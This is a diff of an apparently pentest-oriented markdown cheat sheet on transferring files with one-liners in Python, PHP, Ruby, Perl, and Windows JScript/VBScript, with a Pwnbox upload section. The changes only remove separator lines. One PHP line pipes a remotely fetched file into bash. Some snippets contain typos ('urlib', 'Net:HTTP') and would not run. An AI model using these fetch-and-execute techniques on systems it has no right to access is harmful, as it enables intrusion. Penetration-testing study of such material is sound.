@@ -1,6 +1,6 @@
 # Transferring Files with Code
 
-########################################################################################
+
 ##  Python
 
 ### Download:
@@ -13,7 +13,6 @@ python2.7 -c 'import urlib;urlib.urlretrieve("URL", "plik")'
 python3 -c 'import urllib.request;urllib.request.urlretrieve("URL", "plik")'
 ```
 
-#########################################################################################
 ##  PHP
 
 ### Download:
@@ -29,7 +28,6 @@ php -r 'const BUFFER = 1024; $fremote = fopen("URL", "rb"); $flocal = fopen("pli
 php -r '$lines = @file("URL"); foreach ($lines as $line) { echo $line; }' | bash
 ```
 
-########################################################################################
 ##  Ruby
 
 ### Download:
@@ -38,7 +36,6 @@ php -r '$lines = @file("URL"); foreach ($lines as $line) { echo $line; }' | bash
 ruby -e 'require "net/http"; File.write("plik", Net:HTTP.get(URI.parse("URL")))'
 ```
 
-#########################################################################################
 ##  Perl
 
 ### Download:
@@ -47,7 +44,7 @@ ruby -e 'require "net/http"; File.write("plik", Net:HTTP.get(URI.parse("URL")))'
 perl -e 'use LWP::Simple; getstore("URL", "plik");'
 ```
 
-########################################################################################
+
 ## 🤱 JavaScript (Windows)
 
 ### File `wget.js`:
@@ -69,7 +66,7 @@ BinStream.SaveToFile(WScript.Arguments(1));
 cscript.exe /nologo wget.js URL plik
 ```
 
-########################################################################################
+
 ## 🤱 VBScript (Windows)
 
 ### File `wget.vbs`:
@@ -93,7 +90,7 @@ end with
 cscript.exe /nologo wget.vbs URL plik
 ```
 
-########################################################################################
+
 ## 🐩 Upload with Python3
 
 ### Server (Pwnbox):
